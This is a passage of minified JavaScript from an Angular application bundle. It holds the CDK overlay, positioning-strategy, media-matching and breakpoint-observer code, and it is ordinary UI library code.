      let e = this._portalOutlet.detach();
      return (
        this._detachments.next(),
        this._keyboardDispatcher.remove(this),
        this._detachContentWhenStable(),
        this._locationChanges.unsubscribe(),
        this._outsideClickDispatcher.remove(this),
        e
      );
    }
    dispose() {
      let e = this.hasAttached();
      this._positionStrategy && this._positionStrategy.dispose(),
        this._disposeScrollStrategy(),
        this._disposeBackdrop(this._backdropElement),
        this._locationChanges.unsubscribe(),
        this._keyboardDispatcher.remove(this),
        this._portalOutlet.dispose(),
        this._attachments.complete(),
        this._backdropClick.complete(),
        this._keydownEvents.complete(),
        this._outsidePointerEvents.complete(),
        this._outsideClickDispatcher.remove(this),
        this._host?.remove(),
        (this._previousHostParent = this._pane = this._host = null),
        e && this._detachments.next(),
        this._detachments.complete();
    }
    hasAttached() {
      return this._portalOutlet.hasAttached();
    }
    backdropClick() {
      return this._backdropClick;
    }
    attachments() {
      return this._attachments;
    }
    detachments() {
      return this._detachments;
    }
    keydownEvents() {
      return this._keydownEvents;
    }
    outsidePointerEvents() {
      return this._outsidePointerEvents;
    }
    getConfig() {
      return this._config;
    }
    updatePosition() {
      this._positionStrategy && this._positionStrategy.apply();
    }
    updatePositionStrategy(e) {
      e !== this._positionStrategy &&
        (this._positionStrategy && this._positionStrategy.dispose(),
        (this._positionStrategy = e),
        this.hasAttached() && (e.attach(this), this.updatePosition()));
    }
    updateSize(e) {
      (this._config = C(C({}, this._config), e)), this._updateElementSize();
    }
    setDirection(e) {
      (this._config = Z(C({}, this._config), { direction: e })),
        this._updateElementDirection();
    }
    addPanelClass(e) {
      this._pane && this._toggleClasses(this._pane, e, !0);
    }
    removePanelClass(e) {
      this._pane && this._toggleClasses(this._pane, e, !1);
    }
    getDirection() {
      let e = this._config.direction;
      return e ? ("string" == typeof e ? e : e.value) : "ltr";
    }
    updateScrollStrategy(e) {
      e !== this._scrollStrategy &&
        (this._disposeScrollStrategy(),
        (this._scrollStrategy = e),
        this.hasAttached() && (e.attach(this), e.enable()));
    }
    _updateElementDirection() {
      this._host.setAttribute("dir", this.getDirection());
    }
    _updateElementSize() {
      if (!this._pane) return;
      let e = this._pane.style;
      (e.width = ae(this._config.width)),
        (e.height = ae(this._config.height)),
        (e.minWidth = ae(this._config.minWidth)),
        (e.minHeight = ae(this._config.minHeight)),
        (e.maxWidth = ae(this._config.maxWidth)),
        (e.maxHeight = ae(this._config.maxHeight));
    }
    _togglePointerEvents(e) {
      this._pane.style.pointerEvents = e ? "" : "none";
    }
    _attachBackdrop() {
      let e = "cdk-overlay-backdrop-showing";
      (this._backdropElement = this._document.createElement("div")),
        this._backdropElement.classList.add("cdk-overlay-backdrop"),
        this._animationsDisabled &&
          this._backdropElement.classList.add(
            "cdk-overlay-backdrop-noop-animation"
          ),
        this._config.backdropClass &&
          this._toggleClasses(
            this._backdropElement,
            this._config.backdropClass,
            !0
          ),
        this._host.parentElement.insertBefore(
          this._backdropElement,
          this._host
        ),
        this._backdropElement.addEventListener(
          "click",
          this._backdropClickHandler
        ),
        !this._animationsDisabled && typeof requestAnimationFrame < "u"
          ? this._ngZone.runOutsideAngular(() => {
              requestAnimationFrame(() => {
                this._backdropElement && this._backdropElement.classList.add(e);
              });
            })
          : this._backdropElement.classList.add(e);
    }
    _updateStackingOrder() {
      this._host.nextSibling && this._host.parentNode.appendChild(this._host);
    }
    detachBackdrop() {
      let e = this._backdropElement;
      if (e) {
        if (this._animationsDisabled) return void this._disposeBackdrop(e);
        e.classList.remove("cdk-overlay-backdrop-showing"),
          this._ngZone.runOutsideAngular(() => {
            e.addEventListener(
              "transitionend",
              this._backdropTransitionendHandler
            );
          }),
          (e.style.pointerEvents = "none"),
          (this._backdropTimeout = this._ngZone.runOutsideAngular(() =>
            setTimeout(() => {
              this._disposeBackdrop(e);
            }, 500)
          ));
      }
    }
    _toggleClasses(e, i, n) {
      let r = vi(i || []).filter((o) => !!o);
      r.length && (n ? e.classList.add(...r) : e.classList.remove(...r));
    }
    _detachContentWhenStable() {
      this._ngZone.runOutsideAngular(() => {
        let e = this._ngZone.onStable
          .pipe(st(Ii(this._attachments, this._detachments)))
          .subscribe(() => {
            (!this._pane || !this._host || 0 === this._pane.children.length) &&
              (this._pane &&
                this._config.panelClass &&
                this._toggleClasses(this._pane, this._config.panelClass, !1),
              this._host &&
                this._host.parentElement &&
                ((this._previousHostParent = this._host.parentElement),
                this._host.remove()),
              e.unsubscribe());
          });
      });
    }
    _disposeScrollStrategy() {
      let e = this._scrollStrategy;
      e && (e.disable(), e.detach && e.detach());
    }
    _disposeBackdrop(e) {
      e &&
        (e.removeEventListener("click", this._backdropClickHandler),
        e.removeEventListener(
          "transitionend",
          this._backdropTransitionendHandler
        ),
        e.remove(),
        this._backdropElement === e && (this._backdropElement = null)),
        this._backdropTimeout &&
          (clearTimeout(this._backdropTimeout),
          (this._backdropTimeout = void 0));
    }
  },
  av = "cdk-overlay-connected-position-bounding-box",
  ME = /([A-Za-z%]+)$/,
  td = class {
    get positions() {
      return this._preferredPositions;
    }
    constructor(e, i, n, r, o) {
      (this._viewportRuler = i),
        (this._document = n),
        (this._platform = r),
        (this._overlayContainer = o),
        (this._lastBoundingBoxSize = { width: 0, height: 0 }),
        (this._isPushed = !1),
        (this._canPush = !0),
        (this._growAfterOpen = !1),
        (this._hasFlexibleDimensions = !0),
        (this._positionLocked = !1),
        (this._viewportMargin = 0),
        (this._scrollables = []),
        (this._preferredPositions = []),
        (this._positionChanges = new N()),
        (this._resizeSubscription = Y.EMPTY),
        (this._offsetX = 0),
        (this._offsetY = 0),
        (this._appliedPanelClasses = []),
        (this.positionChanges = this._positionChanges),
        this.setOrigin(e);
    }
    attach(e) {
      this._overlayRef && this._overlayRef,
        this._validatePositions(),
        e.hostElement.classList.add(av),
        (this._overlayRef = e),
        (this._boundingBox = e.hostElement),
        (this._pane = e.overlayElement),
        (this._isDisposed = !1),
        (this._isInitialRender = !0),
        (this._lastPosition = null),
        this._resizeSubscription.unsubscribe(),
        (this._resizeSubscription = this._viewportRuler
          .change()
          .subscribe(() => {
            (this._isInitialRender = !0), this.apply();
          }));
    }
    apply() {
      if (this._isDisposed || !this._platform.isBrowser) return;
      if (!this._isInitialRender && this._positionLocked && this._lastPosition)
        return void this.reapplyLastPosition();
      this._clearPanelClasses(),
        this._resetOverlayElementStyles(),
        this._resetBoundingBoxStyles(),
        (this._viewportRect = this._getNarrowedViewportRect()),
        (this._originRect = this._getOriginRect()),
        (this._overlayRect = this._pane.getBoundingClientRect()),
        (this._containerRect = this._overlayContainer
          .getContainerElement()
          .getBoundingClientRect());
      let s,
        e = this._originRect,
        i = this._overlayRect,
        n = this._viewportRect,
        r = this._containerRect,
        o = [];
      for (let a of this._preferredPositions) {
        let c = this._getOriginPoint(e, r, a),
          l = this._getOverlayPoint(c, i, a),
          u = this._getOverlayFit(l, i, n, a);
        if (u.isCompletelyWithinViewport)
          return (this._isPushed = !1), void this._applyPosition(a, c);
        this._canFitWithFlexibleDimensions(u, l, n)
          ? o.push({
              position: a,
              origin: c,
              overlayRect: i,
              boundingBoxRect: this._calculateBoundingBoxRect(c, a),
            })
          : (!s || s.overlayFit.visibleArea < u.visibleArea) &&
            (s = {
              overlayFit: u,
              overlayPoint: l,
              originPoint: c,
              position: a,
              overlayRect: i,
            });
      }
      if (o.length) {
        let a = null,
          c = -1;
        for (let l of o) {
          let u =
            l.boundingBoxRect.width *
            l.boundingBoxRect.height *
            (l.position.weight || 1);
          u > c && ((c = u), (a = l));
        }
        return (
          (this._isPushed = !1), void this._applyPosition(a.position, a.origin)
        );
      }
      if (this._canPush)
        return (
          (this._isPushed = !0),
          void this._applyPosition(s.position, s.originPoint)
        );
      this._applyPosition(s.position, s.originPoint);
    }
    detach() {
      this._clearPanelClasses(),
        (this._lastPosition = null),
        (this._previousPushAmount = null),
        this._resizeSubscription.unsubscribe();
    }
    dispose() {
      this._isDisposed ||
        (this._boundingBox &&
          Mn(this._boundingBox.style, {
            top: "",
            left: "",
            right: "",
            bottom: "",
            height: "",
            width: "",
            alignItems: "",
            justifyContent: "",
          }),
        this._pane && this._resetOverlayElementStyles(),
        this._overlayRef && this._overlayRef.hostElement.classList.remove(av),
        this.detach(),
        this._positionChanges.complete(),
        (this._overlayRef = this._boundingBox = null),
        (this._isDisposed = !0));
    }
    reapplyLastPosition() {
      if (this._isDisposed || !this._platform.isBrowser) return;
      let e = this._lastPosition;
      if (e) {
        (this._originRect = this._getOriginRect()),
          (this._overlayRect = this._pane.getBoundingClientRect()),
          (this._viewportRect = this._getNarrowedViewportRect()),
          (this._containerRect = this._overlayContainer
            .getContainerElement()
            .getBoundingClientRect());
        let i = this._getOriginPoint(this._originRect, this._containerRect, e);
        this._applyPosition(e, i);
      } else this.apply();
    }
    withScrollableContainers(e) {
      return (this._scrollables = e), this;
    }
    withPositions(e) {
      return (
        (this._preferredPositions = e),
        -1 === e.indexOf(this._lastPosition) && (this._lastPosition = null),
        this._validatePositions(),
        this
      );
    }
    withViewportMargin(e) {
      return (this._viewportMargin = e), this;
    }
    withFlexibleDimensions(e = !0) {
      return (this._hasFlexibleDimensions = e), this;
    }
    withGrowAfterOpen(e = !0) {
      return (this._growAfterOpen = e), this;
    }
    withPush(e = !0) {
      return (this._canPush = e), this;
    }
    withLockedPosition(e = !0) {
      return (this._positionLocked = e), this;
    }
    setOrigin(e) {
      return (this._origin = e), this;
    }
    withDefaultOffsetX(e) {
      return (this._offsetX = e), this;
    }
    withDefaultOffsetY(e) {
      return (this._offsetY = e), this;
    }
    withTransformOriginOn(e) {
      return (this._transformOriginSelector = e), this;
    }
    _getOriginPoint(e, i, n) {
      let r, o;
      if ("center" == n.originX) r = e.left + e.width / 2;
      else {
        let s = this._isRtl() ? e.right : e.left,
          a = this._isRtl() ? e.left : e.right;
        r = "start" == n.originX ? s : a;
      }
      return (
        i.left < 0 && (r -= i.left),
        (o =
          "center" == n.originY
            ? e.top + e.height / 2
            : "top" == n.originY
            ? e.top
            : e.bottom),
        i.top < 0 && (o -= i.top),
        { x: r, y: o }
      );
    }
    _getOverlayPoint(e, i, n) {
      let r, o;
      return (
        (r =
          "center" == n.overlayX
            ? -i.width / 2
            : "start" === n.overlayX
            ? this._isRtl()
              ? -i.width
              : 0
            : this._isRtl()
            ? 0
            : -i.width),
        (o =
          "center" == n.overlayY
            ? -i.height / 2
            : "top" == n.overlayY
            ? 0
            : -i.height),
        { x: e.x + r, y: e.y + o }
      );
    }
    _getOverlayFit(e, i, n, r) {
      let o = lv(i),
        { x: s, y: a } = e,
        c = this._getOffset(r, "x"),
        l = this._getOffset(r, "y");
      c && (s += c), l && (a += l);
      let u = 0 - s,
        d = s + o.width - n.width,
        f = 0 - a,
        m = a + o.height - n.height,
        w = this._subtractOverflows(o.width, u, d),
        M = this._subtractOverflows(o.height, f, m),
        G = w * M;
      return {
        visibleArea: G,
        isCompletelyWithinViewport: o.width * o.height === G,
        fitsInViewportVertically: M === o.height,
        fitsInViewportHorizontally: w == o.width,
      };
    }
    _canFitWithFlexibleDimensions(e, i, n) {
      if (this._hasFlexibleDimensions) {
        let r = n.bottom - i.y,
          o = n.right - i.x,
          s = cv(this._overlayRef.getConfig().minHeight),
          a = cv(this._overlayRef.getConfig().minWidth),
          c = e.fitsInViewportVertically || (null != s && s <= r),
          l = e.fitsInViewportHorizontally || (null != a && a <= o);
        return c && l;
      }
      return !1;
    }
    _pushOverlayOnScreen(e, i, n) {
      if (this._previousPushAmount && this._positionLocked)
        return {
          x: e.x + this._previousPushAmount.x,
          y: e.y + this._previousPushAmount.y,
        };
      let r = lv(i),
        o = this._viewportRect,
        s = Math.max(e.x + r.width - o.width, 0),
        a = Math.max(e.y + r.height - o.height, 0),
        c = Math.max(o.top - n.top - e.y, 0),
        l = Math.max(o.left - n.left - e.x, 0),
        u = 0,
        d = 0;
      return (
        (u =
          r.width <= o.width
            ? l || -s
            : e.x < this._viewportMargin
            ? o.left - n.left - e.x
            : 0),
        (d =
          r.height <= o.height
            ? c || -a
            : e.y < this._viewportMargin
            ? o.top - n.top - e.y
            : 0),
        (this._previousPushAmount = { x: u, y: d }),
        { x: e.x + u, y: e.y + d }
      );
    }
    _applyPosition(e, i) {
      if (
        (this._setTransformOrigin(e),
        this._setOverlayElementStyles(i, e),
        this._setBoundingBoxStyles(i, e),
        e.panelClass && this._addPanelClasses(e.panelClass),
        this._positionChanges.observers.length)
      ) {
        let n = this._getScrollVisibility();
        if (
          e !== this._lastPosition ||
          !this._lastScrollVisibility ||
          !DE(this._lastScrollVisibility, n)
        ) {
          let r = new ed(e, n);
          this._positionChanges.next(r);
        }
        this._lastScrollVisibility = n;
      }
      (this._lastPosition = e), (this._isInitialRender = !1);
    }
    _setTransformOrigin(e) {
      if (!this._transformOriginSelector) return;
      let n,
        i = this._boundingBox.querySelectorAll(this._transformOriginSelector),
        r = e.overlayY;
      n =
        "center" === e.overlayX
          ? "center"
          : this._isRtl()
          ? "start" === e.overlayX
            ? "right"
            : "left"
          : "start" === e.overlayX
          ? "left"
          : "right";
      for (let o = 0; o < i.length; o++)
        i[o].style.transformOrigin = `${n} ${r}`;
    }
    _calculateBoundingBoxRect(e, i) {
      let o,
        s,
        a,
        n = this._viewportRect,
        r = this._isRtl();
      if ("top" === i.overlayY)
        (s = e.y), (o = n.height - s + this._viewportMargin);
      else if ("bottom" === i.overlayY)
        (a = n.height - e.y + 2 * this._viewportMargin),
          (o = n.height - a + this._viewportMargin);
      else {
        let m = Math.min(n.bottom - e.y + n.top, e.y),
          w = this._lastBoundingBoxSize.height;
        (o = 2 * m),
          (s = e.y - m),
          o > w &&
            !this._isInitialRender &&
            !this._growAfterOpen &&
            (s = e.y - w / 2);
      }
      let u,
        d,
        f,
        c = ("start" === i.overlayX && !r) || ("end" === i.overlayX && r);
      if (("end" === i.overlayX && !r) || ("start" === i.overlayX && r))
        (f = n.width - e.x + 2 * this._viewportMargin),
          (u = e.x - this._viewportMargin);
      else if (c) (d = e.x), (u = n.right - e.x);
      else {
        let m = Math.min(n.right - e.x + n.left, e.x),
          w = this._lastBoundingBoxSize.width;
        (u = 2 * m),
          (d = e.x - m),
          u > w &&
            !this._isInitialRender &&
            !this._growAfterOpen &&
            (d = e.x - w / 2);
      }
      return { top: s, left: d, bottom: a, right: f, width: u, height: o };
    }
    _setBoundingBoxStyles(e, i) {
      let n = this._calculateBoundingBoxRect(e, i);
      !this._isInitialRender &&
        !this._growAfterOpen &&
        ((n.height = Math.min(n.height, this._lastBoundingBoxSize.height)),
        (n.width = Math.min(n.width, this._lastBoundingBoxSize.width)));
      let r = {};
      if (this._hasExactPosition())
        (r.top = r.left = "0"),
          (r.bottom = r.right = r.maxHeight = r.maxWidth = ""),
          (r.width = r.height = "100%");
      else {
        let o = this._overlayRef.getConfig().maxHeight,
          s = this._overlayRef.getConfig().maxWidth;
        (r.height = ae(n.height)),
          (r.top = ae(n.top)),
          (r.bottom = ae(n.bottom)),
          (r.width = ae(n.width)),
          (r.left = ae(n.left)),
          (r.right = ae(n.right)),
          "center" === i.overlayX
            ? (r.alignItems = "center")
            : (r.alignItems = "end" === i.overlayX ? "flex-end" : "flex-start"),
          "center" === i.overlayY
            ? (r.justifyContent = "center")
            : (r.justifyContent =
                "bottom" === i.overlayY ? "flex-end" : "flex-start"),
          o && (r.maxHeight = ae(o)),
          s && (r.maxWidth = ae(s));
      }
      (this._lastBoundingBoxSize = n), Mn(this._boundingBox.style, r);
    }
    _resetBoundingBoxStyles() {
      Mn(this._boundingBox.style, {
        top: "0",
        left: "0",
        right: "0",
        bottom: "0",
        height: "",
        width: "",
        alignItems: "",
        justifyContent: "",
      });
    }
    _resetOverlayElementStyles() {
      Mn(this._pane.style, {
        top: "",
        left: "",
        bottom: "",
        right: "",
        position: "",
        transform: "",
      });
    }
    _setOverlayElementStyles(e, i) {
      let n = {},
        r = this._hasExactPosition(),
        o = this._hasFlexibleDimensions,
        s = this._overlayRef.getConfig();
      if (r) {
        let u = this._viewportRuler.getViewportScrollPosition();
        Mn(n, this._getExactOverlayY(i, e, u)),
          Mn(n, this._getExactOverlayX(i, e, u));
      } else n.position = "static";
      let a = "",
        c = this._getOffset(i, "x"),
        l = this._getOffset(i, "y");
      c && (a += `translateX(${c}px) `),
        l && (a += `translateY(${l}px)`),
        (n.transform = a.trim()),
        s.maxHeight &&
          (r ? (n.maxHeight = ae(s.maxHeight)) : o && (n.maxHeight = "")),
        s.maxWidth &&
          (r ? (n.maxWidth = ae(s.maxWidth)) : o && (n.maxWidth = "")),
        Mn(this._pane.style, n);
    }
    _getExactOverlayY(e, i, n) {
      let r = { top: "", bottom: "" },
        o = this._getOverlayPoint(i, this._overlayRect, e);
      if (
        (this._isPushed &&
          (o = this._pushOverlayOnScreen(o, this._overlayRect, n)),
        "bottom" === e.overlayY)
      ) {
        let s = this._document.documentElement.clientHeight;
        r.bottom = s - (o.y + this._overlayRect.height) + "px";
      } else r.top = ae(o.y);
      return r;
    }
    _getExactOverlayX(e, i, n) {
      let s,
        r = { left: "", right: "" },
        o = this._getOverlayPoint(i, this._overlayRect, e);
      if (
        (this._isPushed &&
          (o = this._pushOverlayOnScreen(o, this._overlayRect, n)),
        (s = this._isRtl()
          ? "end" === e.overlayX
            ? "left"
            : "right"
          : "end" === e.overlayX
          ? "right"
          : "left"),
        "right" === s)
      ) {
        let a = this._document.documentElement.clientWidth;
        r.right = a - (o.x + this._overlayRect.width) + "px";
      } else r.left = ae(o.x);
      return r;
    }
    _getScrollVisibility() {
      let e = this._getOriginRect(),
        i = this._pane.getBoundingClientRect(),
        n = this._scrollables.map((r) =>
          r.getElementRef().nativeElement.getBoundingClientRect()
        );
      return {
        isOriginClipped: sv(e, n),
        isOriginOutsideView: Xu(e, n),
        isOverlayClipped: sv(i, n),
        isOverlayOutsideView: Xu(i, n),
      };
    }
    _subtractOverflows(e, ...i) {
      return i.reduce((n, r) => n - Math.max(r, 0), e);
    }
    _getNarrowedViewportRect() {
      let e = this._document.documentElement.clientWidth,
        i = this._document.documentElement.clientHeight,
        n = this._viewportRuler.getViewportScrollPosition();
      return {
        top: n.top + this._viewportMargin,
        left: n.left + this._viewportMargin,
        right: n.left + e - this._viewportMargin,
        bottom: n.top + i - this._viewportMargin,
        width: e - 2 * this._viewportMargin,
        height: i - 2 * this._viewportMargin,
      };
    }
    _isRtl() {
      return "rtl" === this._overlayRef.getDirection();
    }
    _hasExactPosition() {
      return !this._hasFlexibleDimensions || this._isPushed;
    }
    _getOffset(e, i) {
      return "x" === i
        ? null == e.offsetX
          ? this._offsetX
          : e.offsetX
        : null == e.offsetY
        ? this._offsetY
        : e.offsetY;
    }
    _validatePositions() {}
    _addPanelClasses(e) {
      this._pane &&
        vi(e).forEach((i) => {
          "" !== i &&
            -1 === this._appliedPanelClasses.indexOf(i) &&
            (this._appliedPanelClasses.push(i), this._pane.classList.add(i));
        });
    }
    _clearPanelClasses() {
      this._pane &&
        (this._appliedPanelClasses.forEach((e) => {
          this._pane.classList.remove(e);
        }),
        (this._appliedPanelClasses = []));
    }
    _getOriginRect() {
      let e = this._origin;
      if (e instanceof te) return e.nativeElement.getBoundingClientRect();
      if (e instanceof Element) return e.getBoundingClientRect();
      let i = e.width || 0,
        n = e.height || 0;
      return {
        top: e.y,
        bottom: e.y + n,
        left: e.x,
        right: e.x + i,
        height: n,
        width: i,
      };
    }
  };
function Mn(t, e) {
  for (let i in e) e.hasOwnProperty(i) && (t[i] = e[i]);
  return t;
}
function cv(t) {
  if ("number" != typeof t && null != t) {
    let [e, i] = t.split(ME);
    return i && "px" !== i ? null : parseFloat(e);
  }
  return t || null;
}
function lv(t) {
  return {
    top: Math.floor(t.top),
    right: Math.floor(t.right),
    bottom: Math.floor(t.bottom),
    left: Math.floor(t.left),
    width: Math.floor(t.width),
    height: Math.floor(t.height),
  };
}
function DE(t, e) {
  return (
    t === e ||
    (t.isOriginClipped === e.isOriginClipped &&
      t.isOriginOutsideView === e.isOriginOutsideView &&
      t.isOverlayClipped === e.isOverlayClipped &&
      t.isOverlayOutsideView === e.isOverlayOutsideView)
  );
}
var uv = "cdk-global-overlay-wrapper",
  nd = class {
    constructor() {
      (this._cssPosition = "static"),
        (this._topOffset = ""),
        (this._bottomOffset = ""),
        (this._alignItems = ""),
        (this._xPosition = ""),
        (this._xOffset = ""),
        (this._width = ""),
        (this._height = ""),
        (this._isDisposed = !1);
    }
    attach(e) {
      let i = e.getConfig();
      (this._overlayRef = e),
        this._width && !i.width && e.updateSize({ width: this._width }),
        this._height && !i.height && e.updateSize({ height: this._height }),
        e.hostElement.classList.add(uv),
        (this._isDisposed = !1);
    }
    top(e = "") {
      return (
        (this._bottomOffset = ""),
        (this._topOffset = e),
        (this._alignItems = "flex-start"),
        this
      );
    }
    left(e = "") {
      return (this._xOffset = e), (this._xPosition = "left"), this;
    }
    bottom(e = "") {
      return (
        (this._topOffset = ""),
        (this._bottomOffset = e),
        (this._alignItems = "flex-end"),
        this
      );
    }
    right(e = "") {
      return (this._xOffset = e), (this._xPosition = "right"), this;
    }
    start(e = "") {
      return (this._xOffset = e), (this._xPosition = "start"), this;
    }
    end(e = "") {
      return (this._xOffset = e), (this._xPosition = "end"), this;
    }
    width(e = "") {
      return (
        this._overlayRef
          ? this._overlayRef.updateSize({ width: e })
          : (this._width = e),
        this
      );
    }
    height(e = "") {
      return (
        this._overlayRef
          ? this._overlayRef.updateSize({ height: e })
          : (this._height = e),
        this
      );
    }
    centerHorizontally(e = "") {
      return this.left(e), (this._xPosition = "center"), this;
    }
    centerVertically(e = "") {
      return this.top(e), (this._alignItems = "center"), this;
    }
    apply() {
      if (!this._overlayRef || !this._overlayRef.hasAttached()) return;
      let e = this._overlayRef.overlayElement.style,
        i = this._overlayRef.hostElement.style,
        n = this._overlayRef.getConfig(),
        { width: r, height: o, maxWidth: s, maxHeight: a } = n,
        c = !(
          ("100%" !== r && "100vw" !== r) ||
          (s && "100%" !== s && "100vw" !== s)
        ),
        l = !(
          ("100%" !== o && "100vh" !== o) ||
          (a && "100%" !== a && "100vh" !== a)
        ),
        u = this._xPosition,
        d = this._xOffset,
        f = "rtl" === this._overlayRef.getConfig().direction,
        m = "",
        w = "",
        M = "";
      c
        ? (M = "flex-start")
        : "center" === u
        ? ((M = "center"), f ? (w = d) : (m = d))
        : f
        ? "left" === u || "end" === u
          ? ((M = "flex-end"), (m = d))
          : ("right" === u || "start" === u) && ((M = "flex-start"), (w = d))
        : "left" === u || "start" === u
        ? ((M = "flex-start"), (m = d))
        : ("right" === u || "end" === u) && ((M = "flex-end"), (w = d)),
        (e.position = this._cssPosition),
        (e.marginLeft = c ? "0" : m),
        (e.marginTop = l ? "0" : this._topOffset),
        (e.marginBottom = this._bottomOffset),
        (e.marginRight = c ? "0" : w),
        (i.justifyContent = M),
        (i.alignItems = l ? "flex-start" : this._alignItems);
    }
    dispose() {
      if (this._isDisposed || !this._overlayRef) return;
      let e = this._overlayRef.overlayElement.style,
        i = this._overlayRef.hostElement,
        n = i.style;
      i.classList.remove(uv),
        (n.justifyContent =
          n.alignItems =
          e.marginTop =
          e.marginBottom =
          e.marginLeft =
          e.marginRight =
          e.position =
            ""),
        (this._overlayRef = null),
        (this._isDisposed = !0);
    }
  },
  xE = (() => {
    let e = class e {
      constructor(n, r, o, s) {
        (this._viewportRuler = n),
          (this._document = r),
          (this._platform = o),
          (this._overlayContainer = s);
      }
      global() {
        return new nd();
      }
      flexibleConnectedTo(n) {
        return new td(
          n,
          this._viewportRuler,
          this._document,
          this._platform,
          this._overlayContainer
        );
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(qu), h(T), h(ge), h(bi));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  EE = 0,
  it = (() => {
    let e = class e {
      constructor(n, r, o, s, a, c, l, u, d, f, m, w) {
        (this.scrollStrategies = n),
          (this._overlayContainer = r),
          (this._componentFactoryResolver = o),
          (this._positionBuilder = s),
          (this._keyboardDispatcher = a),
          (this._injector = c),
          (this._ngZone = l),
          (this._document = u),
          (this._directionality = d),
          (this._location = f),
          (this._outsideClickDispatcher = m),
          (this._animationsModuleType = w);
      }
      create(n) {
        let r = this._createHostElement(),
          o = this._createPaneElement(r),
          s = this._createPortalOutlet(o),
          a = new Hr(n);
        return (
          (a.direction = a.direction || this._directionality.value),
          new Tt(
            s,
            r,
            o,
            a,
            this._ngZone,
            this._keyboardDispatcher,
            this._document,
            this._location,
            this._outsideClickDispatcher,
            "NoopAnimations" === this._animationsModuleType
          )
        );
      }
      position() {
        return this._positionBuilder;
      }
      _createPaneElement(n) {
        let r = this._document.createElement("div");
        return (
          (r.id = "cdk-overlay-" + EE++),
          r.classList.add("cdk-overlay-pane"),
          n.appendChild(r),
          r
        );
      }
      _createHostElement() {
        let n = this._document.createElement("div");
        return this._overlayContainer.getContainerElement().appendChild(n), n;
      }
      _createPortalOutlet(n) {
        return (
          this._appRef || (this._appRef = this._injector.get(tt)),
          new fa(
            n,
            this._componentFactoryResolver,
            this._appRef,
            this._injector,
            this._document
          )
        );
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(
          h(CE),
          h(bi),
          h(Ht),
          h(xE),
          h(wE),
          h(re),
          h(O),
          h(T),
          h(Br),
          h(pt),
          h(bE),
          h(oi, 8)
        );
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  OE = new b("cdk-connected-overlay-scroll-strategy", {
    providedIn: "root",
    factory: () => {
      let t = v(it);
      return () => t.scrollStrategies.reposition();
    },
  });
function IE(t) {
  return () => t.scrollStrategies.reposition();
}
var Dn,
  PE = { provide: OE, deps: [it], useFactory: IE },
  ga = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({ providers: [it, PE], imports: [en, bn, Yu, Yu] })),
      e
    );
  })(),
  SE = (() => {
    let e = class e {
      create(n) {
        return typeof MutationObserver > "u" ? null : new MutationObserver(n);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  hv = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({ providers: [SE] })),
      e
    );
  })(),
  pv = new Set(),
  TE = (() => {
    let e = class e {
      constructor(n, r) {
        (this._platform = n),
          (this._nonce = r),
          (this._matchMedia =
            this._platform.isBrowser && window.matchMedia
              ? window.matchMedia.bind(window)
              : RE);
      }
      matchMedia(n) {
        return (
          (this._platform.WEBKIT || this._platform.BLINK) && AE(n, this._nonce),
          this._matchMedia(n)
        );
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(ge), h(er, 8));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })();
function AE(t, e) {
  if (!pv.has(t))
    try {
      Dn ||
        ((Dn = document.createElement("style")),
        e && Dn.setAttribute("nonce", e),
        Dn.setAttribute("type", "text/css"),
        document.head.appendChild(Dn)),
        Dn.sheet &&
          (Dn.sheet.insertRule(`@media ${t} {body{ }}`, 0), pv.add(t));
    } catch (i) {
      console.error(i);
    }
}
function RE(t) {
  return {
    matches: "all" === t || "" === t,
    media: t,
    addListener: () => {},
    removeListener: () => {},
  };
}
var mv = (() => {
  let e = class e {
    constructor(n, r) {
      (this._mediaMatcher = n),
        (this._zone = r),
        (this._queries = new Map()),
        (this._destroySubject = new N());
    }
    ngOnDestroy() {
      this._destroySubject.next(), this._destroySubject.complete();
    }
    isMatched(n) {
      return gv(vi(n)).some((o) => this._registerQuery(o).mql.matches);
    }
    observe(n) {
      let s = sn(gv(vi(n)).map((a) => this._registerQuery(a).observable));
      return (
        (s = Rt(s.pipe(ue(1)), s.pipe(Pi(1), wo(0)))),
        s.pipe(
          F((a) => {
            let c = { matches: !1, breakpoints: {} };
            return (
              a.forEach(({ matches: l, query: u }) => {
                (c.matches = c.matches || l), (c.breakpoints[u] = l);
              }),
              c
            );
          })
        )
      );
    }
    _registerQuery(n) {
      if (this._queries.has(n)) return this._queries.get(n);
      let r = this._mediaMatcher.matchMedia(n),
        s = {
          observable: new L((a) => {
            let c = (l) => this._zone.run(() => a.next(l));
            return (
              r.addListener(c),
              () => {
                r.removeListener(c);
              }
            );
          }).pipe(
            ot(r),
            F(({ matches: a }) => ({ query: n, matches: a })),
            st(this._destroySubject)
          ),
          mql: r,
        };
      return this._queries.set(n, s), s;
    }
  };
  return (
    (e.ɵfac = function (r) {
      return new (r || e)(h(TE), h(O));
    }),
    (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
    e
  );
})();
function gv(t) {
  return t
    .map((e) => e.split(","))
    .reduce((e, i) => e.concat(i))
    .map((e) => e.trim());
}
var zr = (() => {
  let e = class e {
    constructor(n) {
      this._platform = n;
    }
    isDisabled(n) {
      return n.hasAttribute("disabled");
    }
    isVisible(n) {
      return kE(n) && "visible" === getComputedStyle(n).visibility;
    }
    isTabbable(n) {
      if (!this._platform.isBrowser) return !1;
      let r = NE(HE(n));
      if (r && (-1 === vv(r) || !this.isVisible(r))) return !1;
      let o = n.nodeName.toLowerCase(),
        s = vv(n);
      return n.hasAttribute("contenteditable")
        ? -1 !== s
        : !(
            "iframe" === o ||
            "object" === o ||
            (this._platform.WEBKIT && this._platform.IOS && !UE(n))
          ) &&
            ("audio" === o
              ? !!n.hasAttribute("controls") && -1 !== s
              : "video" === o
              ? -1 !== s &&
